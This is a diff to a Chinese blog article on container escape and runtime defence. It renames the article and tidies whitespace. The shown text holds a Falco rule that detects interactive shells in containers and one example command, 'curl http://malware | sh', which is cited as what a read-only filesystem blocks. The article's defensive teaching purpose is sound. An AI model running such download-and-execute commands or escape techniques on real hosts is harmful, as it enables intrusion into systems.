@@ -1,7 +1,8 @@
 ---
-title: "面试官：黑客突破容器获取 root 权限后，如何逃逸到宿主机？如何基于 eBPF 与内核安全模块实现零信任防御？（从 Capabilities 提权、procfs 泄露到 seccomp 与 Falco 运行时入侵检测）"
+title: "容器逃逸攻防与零信任运行时安全：Capabilities 提权、procfs 泄露与 eBPF Falco 入侵检测"
 description: "深度拆解大厂云原生安全与容器逃逸攻防对抗第一线。为什么“容器内 root 不等于宿主机 root”在安全审计中仍被直接勒令整改？深度还原三大经典容器逃逸路径：privileged 特权容器与设备节点挂载逃逸、CAP_SYS_ADMIN 与 notify_on_release 核心逃逸、/proc 敏感目录与 core_pattern 管道逃逸；逆向分析 Linux 内核最小特权防护网：Capabilities 精细剪裁、seccomp 系统调用白名单与 AppArmor/SELinux 强制访问控制；详解新一代 eBPF 运行时威胁检测引擎 Falco：如何在内核 sys_enter / sys_exit 探针以微秒级延迟捕获未知反弹 Shell、无痕提权与特权突破。"
 publishedAt: "2026-07-01"
+updatedAt: "2026-10-29"
 tags: ["Kubernetes", "面试题", "容器安全", "容器逃逸", "eBPF", "Falco", "Linux内核", "系统设计"]
 category: "系统架构设计与资深实战"
 draft: false
@@ -13,10 +14,10 @@ series: "Kubernetes 架构内核与生产实战"
 
 ---
 
-## 一、 面试现场：从“容器内拿到了 root”到“宿主机沦陷逃逸”的连环追问
+## 一、 核心痛点与演进背景：从“容器内拿到了 root”到“宿主机沦陷逃逸”的连环追问
 
 ```text
-面试官提问：
+核心架构挑战：
   "假设攻击者利用某个未知的 0-day 漏洞突破了你负责的支付系统业务容器，拿到了一个 Bash root 交互 Shell。
    请问：
    1. 攻击者此时在宿主机视角下到底是不是真正的超级管理员？有哪些经典的操作系统机制能让他直接‘逃离’容器，拿到宿主机控制权？
@@ -167,7 +168,7 @@ flowchart TB
         Syscall["系统调用派发点 (sys_enter / sys_exit)"]
         eBPFProbe["Falco eBPF 探针 (挂载在 Tracepoint/Kprobe)"]
         RingBuffer["BPF 环形无锁缓冲区 (Perf/Ring Buffer)"]
-        
+
         Syscall --> eBPFProbe --> RingBuffer
     end
 
@@ -176,7 +177,7 @@ flowchart TB
         K8sEnricher["K8s 元数据富化器 (注入 Pod/Namespace/Container 信息)"]
         RulesEngine["规则匹配引擎 (检测反弹 Shell、特权提权)"]
         AlertSink["告警输出 (Slack / PagerDuty / Webhook 自动隔离)"]
-        
+
         RingReader --> K8sEnricher --> RulesEngine --> AlertSink
     end
 
@@ -200,9 +201,9 @@ Falco 在内核态直接读取系统调用参数，并与安全规则进行秒�
     and shell_procs and proc.tty != 0
     and container.image.repository not in (my_debug_images)
   output: >
-    [CRITICAL] 捕获容器内可疑交互式 Shell 终端启动! 
-    (user=%user.name user_loginuid=%user.loginuid pod=%k8s.pod.name 
-    namespace=%k8s.ns.name image=%container.image.repository 
+    [CRITICAL] 捕获容器内可疑交互式 Shell 终端启动!
+    (user=%user.name user_loginuid=%user.loginuid pod=%k8s.pod.name
+    namespace=%k8s.ns.name image=%container.image.repository
     cmdline=%proc.cmdline connection=%fd.name)
   priority: CRITICAL
   tags: [container, mitre_execution]
@@ -245,17 +246,17 @@ metadata:
 
 ---
 
-## 六、 面试通关复盘与架构师高分回答模板
+## 六、 架构决策复盘与生产级核心要点总结
 
 ### 6.1 现场 2 分钟极速电梯演讲
 
 > “面试官，在 Linux 物理视角下，容器进程直接运行在宿主机共享内核上，容器内的 root 默认在内核态就是超级用户。因此，防止黑客逃逸绝不能寄希望于脆弱的容器边界，而必须构筑**‘三道不可突破的纵深防线’**：
-> 
+>
 > 1. **第一道防线：静态准入阶段基于 PSA 锁死特权攻击面**。在生产命名空间强制开启 `Pod Security Admission: Restricted` 模式，物理上绝对封杀 `privileged: true`、禁止挂载宿主机 `/proc`、`/dev` 与 Docker Socket；强制启用 `runAsNonRoot: true` 与 `readOnlyRootFilesystem: true`（只读根文件系统），使黑客无法落盘任何后门二进制程序；
 > 2. **第二道防线：内核执行期剪裁 Capabilities 与启用 seccomp**。在所有容器 Spec 中强制声明 `drop: ["ALL"]` 剥离包括 `CAP_SYS_ADMIN` 在内的一切危险权能，使 `mount` 与 cgroups `release_agent` 逃逸从内核层失效；同时挂载官方 `RuntimeDefault` seccomp 配置文件，阻断 300 多个可能被用于内核提权的敏感系统调用；
 > 3. **第三道防线：运行时动态感知基于 eBPF（Falco）实现零信任监控**。在宿主机内核 Tracepoint 部署 Falco eBPF 探针，以低于 1.5% 的极低性能损耗，微秒级捕获非法 `execve` 反弹 Shell、敏感文件篡改与未授权命名空间穿越，并在检测到攻击时联动准入控制器瞬间斩断网络连接或杀死隔离 Pod。”
 
-### 6.2 生产面试关键避坑守则
+### 6.2 生产级架构关键避坑守则
 
 1. **绝对禁止挂载 Docker/Containerd Socket**：研发在写 CI/CD 工具（如 DinD）时，喜欢通过 `hostPath: /var/run/docker.sock` 挂载宿主机套接字。攻击者拿到该 Socket 后，可以直接调用 Daemon REST API 创建一个特权容器，完成 100% 毫无阻碍的秒级逃逸。必须强制改用 Kaniko、BuildKit 或 rootless 独立容器构建工具；
 2. **只读根文件系统（readOnlyRootFilesystem）的威力**：将业务容器的 root 设为只读，如果有写临时日志需求，单独挂载一个 `emptyDir` 内存卷。攻击者哪怕拿到 Shell，也无法执行 `curl http://malware | sh` 下载木马或编译可执行文件，直接瓦解了 80% 的攻击载荷；
